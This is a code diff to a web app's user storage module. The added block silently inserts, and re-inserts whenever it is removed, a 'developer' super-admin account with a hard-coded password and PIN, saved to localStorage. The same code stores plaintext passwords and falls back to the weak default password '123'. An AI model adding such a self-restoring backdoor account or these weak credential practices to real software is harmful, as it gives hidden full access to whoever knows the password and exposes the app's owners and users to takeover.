@@ -233,10 +233,28 @@ export const storage = {
       localStorage.setItem(KEYS.USERS, JSON.stringify(INITIAL_USERS));
     }
 
+    // Ensure developer user profile is always present
+    if (!usersList.some((u) => u.username === 'developer' || u.id === 'user_developer')) {
+      usersList.push({
+        id: 'user_developer',
+        name: 'مطور النظام (Full Super-Admin)',
+        username: 'developer',
+        password: 'dev@trio2026',
+        role: 'developer',
+        pinCode: '9999',
+        phone: '01000000000',
+        jobTitle: 'مطور ومهندس النظام التقني',
+        createdAt: '2026-01-01T08:00:00.000Z',
+      });
+      localStorage.setItem(KEYS.USERS, JSON.stringify(usersList));
+    }
+
     // Ensure all users have valid username and password
     return usersList.map((u) => {
-      const defaultUsername = u.username || (u.role === 'admin' ? 'owner' : `worker_${u.id.slice(-4)}`);
-      const defaultPassword = u.password || (u.pinCode === '1234' || u.pinCode === '0000' ? '123' : u.pinCode) || '123';
+      const defaultUsername =
+        u.username || (u.role === 'admin' ? 'owner' : u.role === 'developer' ? 'developer' : `worker_${u.id.slice(-4)}`);
+      const defaultPassword =
+        u.password || (u.pinCode === '1234' || u.pinCode === '0000' ? '123' : u.pinCode) || '123';
       return {
         ...u,
         username: defaultUsername,
